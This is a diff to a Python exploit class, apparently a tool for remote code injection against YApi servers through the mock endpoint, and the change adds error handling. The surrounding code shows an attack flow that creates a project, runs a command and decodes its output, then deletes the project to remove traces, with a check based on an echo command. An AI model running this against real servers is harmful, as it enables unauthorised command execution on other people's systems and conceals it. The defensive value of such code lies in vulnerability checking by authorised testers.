@@ -101,6 +101,7 @@ class attack_yapi:
                                     return project_id, interface_id
         except Exception as msg:
             pass
+        return None, None
 
     def code_injection(self, session, project_id, interface_id, command):
         try:
@@ -113,7 +114,7 @@ class attack_yapi:
                 req = session.get(self.url + "/mock/{}/{}".format(project_id, self.rand), headers=self.get_headers, verify=False, timeout=10, proxies=self.proxy)
                 if req.status_code == 200:
                     return bytes.decode(base64.b64decode(bytes(req.text, "utf-8")))
-        except Exception as msg:
+        except:
             pass
 
     def del_info(self, session, project_id, interface_id):
@@ -125,13 +126,16 @@ class attack_yapi:
         session.post(self.url + "/api/project/del", headers=self.post_headers, data=json.dumps(data), verify=False, timeout=10, proxies=self.proxy)
 
     def verify_yapi(self, session):
-        command = "echo {}".format(self.rand)
-        project_id, interface_id = self.exploit(session)
-        if project_id is not None:
-            res = self.code_injection(session, project_id, interface_id, command)
-            self.del_info(session, project_id, interface_id)
-            if self.rand in res:
-                return True
+        try:
+            command = "echo {}".format(self.rand)
+            project_id, interface_id = self.exploit(session)
+            if project_id is not None:
+                res = self.code_injection(session, project_id, interface_id, command)
+                self.del_info(session, project_id, interface_id)
+                if self.rand in res:
+                    return True
+        except:
+            pass
         return False
 
 
